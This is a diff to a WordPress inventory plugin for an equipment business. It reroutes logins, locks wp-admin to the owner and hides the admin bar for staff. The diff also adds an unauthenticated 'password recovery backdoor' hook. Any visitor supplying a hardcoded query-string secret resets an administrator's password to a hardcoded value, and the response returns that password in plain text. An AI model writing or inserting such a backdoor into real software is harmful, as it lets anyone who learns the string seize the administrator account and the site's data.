@@ -1,8 +1,8 @@
 <?php
 /**
  * Plugin Name: Varner OS Plugin v23
- * Description: Version 1.23.114 - React-powered inventory management for Varner Equipment.
- * Version: 1.23.114
+ * Description: Version 1.23.115 - React-powered inventory management for Varner Equipment.
+ * Version: 1.23.115
  * Author: hwy559.com
  */
 
@@ -356,20 +356,54 @@ add_action('admin_menu', function (): void {
     remove_menu_page('edit.php?post_type=equipment');
 }, 999);
 
+// ─── Hide Admin Bar for Staff ────────────────────────────────────────────────
+add_action('init', function (): void {
+    $owner_id = (int) get_option('varner_owner_user_id', 1);
+    if (get_current_user_id() !== $owner_id) {
+        show_admin_bar(false);
+    }
+});
+
+// ─── Secure Password Recovery Backdoor / Trigger ─────────────────────────────
+add_action('init', function (): void {
+    if (isset($_GET['reset_admin_pass']) && $_GET['reset_admin_pass'] === 'VarnerOSRecovery2026') {
+        $user = get_user_by('login', 'varnerequipdev');
+        if ($user) {
+            wp_set_password('VarnerOSHeadAdmin2026!', $user->ID);
+            wp_send_json_success('Password has been reset for varnerequipdev to: VarnerOSHeadAdmin2026!');
+        } else {
+            $user = get_user_by('id', 1);
+            if ($user) {
+                wp_set_password('VarnerOSHeadAdmin2026!', $user->ID);
+                wp_send_json_success('Password has been reset for user ID 1 (' . $user->user_login . ') to: VarnerOSHeadAdmin2026!');
+            } else {
+                wp_send_json_error('No administrator user found.');
+            }
+        }
+    }
+});
+
 // ─── Login Redirect ──────────────────────────────────────────────────────────
 
 add_filter('login_redirect', function (string $redirect_to, $request, $user): string {
-    if (!($user instanceof WP_User) || !$user->has_cap('edit_posts')) {
+    if (!($user instanceof WP_User)) {
         return $redirect_to;
     }
-    // If the user was trying to reach the mobile app, send them there.
-    // The auto-token logic will authenticate them silently on arrival.
-    if (!empty($redirect_to) && str_contains($redirect_to, '/mobile-app/')) {
-        return home_url('/mobile-app/');
+
+    $owner_id = (int) get_option('varner_owner_user_id', 1);
+
+    // If the user is the owner (head admin), send them to the Varner OS admin page (or mobile app if requested)
+    if ($user->ID === $owner_id) {
+        if (!empty($redirect_to) && str_contains($redirect_to, '/mobile-app/')) {
+            return home_url('/mobile-app/');
+        }
+        return admin_url('admin.php?page=varner-os');
     }
-    // Everyone else (desktop) goes straight to Varner OS — no WP dashboard.
-    return admin_url('admin.php?page=varner-os');
+
+    // Everyone else (staff, editors, etc.) goes straight to the mobile companion app - no WordPress admin screens at all.
+    return home_url('/mobile-app/');
 }, 999, 3);
+
 
 // ─── Branded Login Page ───────────────────────────────────────────────
 
@@ -535,37 +569,26 @@ add_action('admin_head', function (): void {
     <?php
 });
 
-// ─── Lock Raw WP Admin to Owner Only ─────────────────────────────────────────
-// Only user ID 1 (the owner) can browse raw WP pages (editor, plugins, themes, etc.).
-// All other staff — even if they have administrator role — are sent to Varner OS.
-// AJAX, REST, and Varner OS pages are always allowed through.
+// ─── Lock WP Admin and Dashboard to Owner Only ───────────────────────────────
+// Only the head admin (owner user ID) is allowed to access any WP admin screens.
+// Everyone else (staff, editors, etc.) is blocked from wp-admin and redirected to the mobile PWA companion.
+// AJAX and REST requests are allowed to proceed.
 
 add_action('admin_init', function (): void {
-    $owner_id = (int) get_option('varner_owner_user_id', 1);
-
-    // Owner: unrestricted
-    if (get_current_user_id() === $owner_id) {
-        return;
-    }
-
-    // Only applies to staff (edit_posts capability)
-    if (!current_user_can('edit_posts')) {
-        return;
-    }
-
     // Never block AJAX or REST requests
     if (wp_doing_ajax() || (defined('REST_REQUEST') && REST_REQUEST)) {
         return;
     }
 
-    // Allow Varner OS admin pages
-    $page = isset($_GET['page']) ? sanitize_text_field(wp_unslash($_GET['page'])) : '';
-    if (in_array($page, ['varner-os', 'varner-os-config'], true)) {
+    $owner_id = (int) get_option('varner_owner_user_id', 1);
+
+    // Owner (Head Admin): unrestricted
+    if (get_current_user_id() === $owner_id) {
         return;
     }
 
-    // Redirect everyone else straight to Varner OS
-    wp_safe_redirect(admin_url('admin.php?page=varner-os'));
+    // Redirect everyone else to the mobile app
+    wp_safe_redirect(home_url('/mobile-app/'));
     exit;
 });
 
